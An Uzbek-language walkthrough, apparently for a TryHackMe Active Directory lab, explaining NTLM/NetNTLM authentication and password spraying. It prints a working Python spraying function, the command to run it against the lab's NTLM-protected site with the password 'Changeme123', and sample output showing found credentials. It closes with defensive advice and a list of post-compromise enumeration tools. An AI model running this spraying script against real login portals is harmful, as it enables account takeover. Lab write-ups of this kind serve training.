**NTLM va NetNTLM**

**New Technology LAN Manager (NTLM)** — bu Active Directory (AD) tizimida foydalanuvchilarni autentifikatsiya qilish (ya'ni, kimligini tasdiqlash) uchun ishlatiladigan xavfsizlik protokollari to‘plamidir. NTLM foydalanuvchini autentifikatsiya qilish uchun **NetNTLM** deb ataladigan **challenge-response** (chaqiruv-javob) sxemasi asosida ishlatiladi.

Bu autentifikatsiya mexanizmi tarmoqdagi xizmatlar tomonidan keng qo‘llaniladi. Biroq, **NetNTLM ishlatadigan xizmatlar ba’zan internetga ochiq bo‘ladi**, ya’ni tashqi hujumchilar ham ularga ulana olishadi. Quyidagi holatlar bunga misol bo‘la oladi:

* Ichki Exchange (pochta) serverlari — masalan, Outlook Web App (OWA) login portali.
* Internetga ochiq bo‘lgan RDP (Remote Desktop Protocol) xizmatlari.
* Active Directory bilan bog‘langan VPN nuqtalari (endpoints).
* Internet orqali ochiladigan va NetNTLM'dan foydalanadigan veb-ilovalar.

**NetNTLM**, ko‘pincha **Windows Authentication** yoki shunchaki **NTLM Authentication** deb ham ataladi. Bu autentifikatsiya usuli ilovaga foydalanuvchi va Active Directory (AD) o‘rtasida **vositachi** (middle man) bo‘lish imkonini beradi.

Ya’ni, barcha autentifikatsiya ma’lumotlari **challenge** shaklida Domain Controller’ga (AD serveriga) yuboriladi. Agar challenge’ga to‘g‘ri javob berilsa, ilova foydalanuvchini muvaffaqiyatli autentifikatsiyadan o‘tkazadi.

Bu degani, ilova foydalanuvchini bevosita o‘zida autentifikatsiya qilmaydi, balki foydalanuvchining nomidan AD orqali qilinadi. Shuning uchun, ilova foydalanuvchining AD login va parolini saqlamaydi — bunday ma’lumotlar faqat Domain Controller’da saqlanishi kerak.

---

### **Tushuntirish (sodda qilib):**

1. **NTLM** bu Microsoft'ning foydalanuvchini aniqlash (autentifikatsiya) qilish usuli.
2. **NetNTLM** — NTLM asosida ishlaydigan challenge-response tizimi. Bu tizimda foydalanuvchi login qilmoqchi bo‘lsa, unga maxsus savol (challenge) yuboriladi va foydalanuvchi to‘g‘ri javob (response) qaytarishi kerak.
3. NetNTLM ba’zi xizmatlar (mail, VPN, RDP, saytlar) orqali tashqaridan ochiq bo‘lishi mumkin, bu esa hujumchilarga imkon yaratadi.
4. NetNTLM yordamida saytlar yoki ilovalar foydalanuvchini **bevosita** emas, **vositachi sifatida** AD orqali autentifikatsiya qiladi.
5. Bu usul foydalanuvchi parolini ilova o‘zida saqlamaslikka yordam beradi — bu esa xavfsizlikni oshiradi.

![NTLM](https://raw.githubusercontent.com/akhatkulov/cheatsheets-for-windows/refs/heads/main/Breaching%20Active%20Directory/NTLM%20Authenticated%20Services/c9113ad0ff443dd0973736552e85aa69%20(1).png)


**2-vazifada** aytilganidek, internetga ochiq xizmatlar oldin topilgan login ma'lumotlarini sinash uchun ajoyib joydir. Biroq, bu xizmatlardan to‘g‘ridan-to‘g‘ri foydalanib, Active Directory (AD) tizimining haqiqiy login ma’lumotlarini aniqlashga ham urinib ko‘rish mumkin.

Masalan, agar siz OSINT yordamida haqiqiy elektron pochta manzillarini topgan bo‘lsangiz, bu xizmatlar orqali **brute-force** (bir necha parollarni ketma-ket urinish) hujumlarini amalga oshirishga urinish mumkin bo‘ladi.

### Ammo muammo shundaki:

Ko‘pgina AD tizimlarida **account lockout** (hisobni vaqtincha bloklash) mexanizmi yoqilgan bo‘ladi. Bu holatda har bir foydalanuvchi uchun ko‘p marta noto‘g‘ri parol kiritilsa, u hisob vaqtincha bloklanadi. Shuning uchun, **klassik brute-force** usuli ishlamaydi.

### Shuning uchun nima qilish kerak?

**Password spraying** deb ataladigan usuldan foydalaniladi.

#### Password Spraying nima?

* Sizda foydalanuvchi nomlari (username) ro‘yxati bo‘ladi.
* Siz **bitta parol** (masalan, "Changeme123") bilan **hamma foydalanuvchilarni** sinab chiqasiz.
* Bu AD lockout mexanizmini chetlab o‘tadi, chunki har bir foydalanuvchi uchun faqat **bitta** urinish bo‘ladi.
* Ammo bu ham xavfli, chunki bu usul ko‘p noto‘g‘ri urinishlar sababli monitoring vositalari orqali aniqlanishi mumkin.

### Vazifa konteksti:

* Sizga OSINT orqali topilgan username'lar ro‘yxati berilgan.
* Shuningdek, kompaniya foydalanuvchilari odatda **"Changeme123"** parolidan boshlashlari aniqlangan.
* Ko‘plab foydalanuvchilar parollarini o‘zgartirishni unutishadi.
* Sizdan berilgan URL'dagi web-ilovaga qarshi password spraying hujumi qilish so‘raladi:
  **[http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com)**

Ushbu sayt Windows Authentication so‘raydi (NetNTLM asosida).

> **Eslatma**: Windows Authentication uchun **Chrome** ishlatish tavsiya qilinadi. Firefox'ning bu boradagi pluginlari ko‘p hollarda ishlamaydi.

---

### **Script Tushuntirishi:**

Sizga quyidagi Python funksiyasi berilgan:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    for user in self.users:
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

#### **Bu funksiya nima qiladi?**

1. **Bitta parolni** (`password`) olib, sizda bor barcha `user`lar bilan sinab chiqadi.
2. Har bir user uchun `requests.get()` orqali HTTP so‘rov yuboriladi.

   * Bu so‘rov NTLM autentifikatsiya bilan birga boradi.
3. Agar server `200 OK` javob bersa, bu user-parol juftligi **to‘g‘ri**.
4. Agar `401 Unauthorized` bo‘lsa, bu noto‘g‘ri.
5. Natijada necha nafar foydalanuvchi uchun bu parol to‘g‘ri chiqqani hisoblab beriladi.

---

### **Xulosa va xavfsizlik tavsiyasi:**

* Bu hujum turlari **real tashkilotlarga juda katta xavf** tug‘diradi.
* Shuning uchun tashkilotlar:

  * Har bir foydalanuvchiga **parolni almashtirishni majburiy** qilishlari kerak.
  * IP asosida **authentication limit** joriy etishlari kerak.
  * Keraksiz internetga ochiq xizmatlarni **yopish yoki cheklash** kerak.
  * Kerakli joylarda **MFA (multi-factor authentication)** joriy etilishi kerak.


### 🔐 **Parolni Purkash (Password Spraying)**

Agar siz **AttackBox** dan foydalanayotgan bo‘lsangiz, **parolni purkash (password spraying)** script fayli va username ro‘yxati fayli quyidagi papkada joylashgan bo‘ladi:

```
/root/Rooms/BreachingAD/task3/
```

### 🖥 Skriptni ishga tushirish:

Quyidagi buyruq orqali skriptni ishga tushiramiz:

```bash
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

#### Parametrlarning ma’nosi:

| Parametr      | Tavsif                                                                                                   |
| ------------- | -------------------------------------------------------------------------------------------------------- |
| `<userfile>`  | Username’lar ro‘yxati yozilgan fayl. Misol: `usernames.txt`                                              |
| `<fqdn>`      | Tashkilotga tegishli to‘liq domen nomi. Misol: `za.tryhackme.com`                                        |
| `<password>`  | Hujumda sinaladigan yagona parol. Misol: `Changeme123`                                                   |
| `<attackurl>` | Windows Authentication’ni qo‘llab-quvvatlaydigan sayt manzili. Misol: `http://ntlmauth.za.tryhackme.com` |

### 🧪 Misol hujum:

Quyidagi buyruq ishlatilgan:

```bash
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

Natijada chiqadigan loglar:

```
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: henry.taylor
[...]
[+] Valid credential pair found! Username: [...] Password: Changeme123
[-] Failed login with Username: louise.talbot
[*] Password spray attack completed, [X] valid credential pairs found
```

### ✅ **Natija:**

Bu hujum orqali siz **OSINT (tashqi kuzatuv orqali olingan ma’lumotlar)** va **NetNTLM asosidagi Password Spraying** texnikasidan foydalanib:

* Bir necha foydalanuvchi nomlariga bitta parolni urinasiz.
* Shundan keyin bir nechta **to‘g‘ri login-parol** juftligini qo‘lga kiritishingiz mumkin.

Bu login ma’lumotlari sizga keyinchalik **Active Directory’ni ichkaridan tahlil qilish** (enumeration) uchun kerak bo‘ladi — masalan, kim qanday rolga ega, qanday kompyuterlar bor, qanday xizmatlar ishlatilmoqda va hokazo.

---

### 🧠 **Esda tuting:**

* Password spraying — bu **"har bir foydalanuvchiga bitta parol"** usulidir.
* Bu hujumdan so‘ng siz haqiqiy AD foydalanuvchisining login va parolini bilib olgan bo‘lasiz.
* Endi siz **kerakli asboblar (BloodHound, CrackMapExec, PowerView)** orqali AD’ni ichkaridan o‘rganishingiz mumkin.
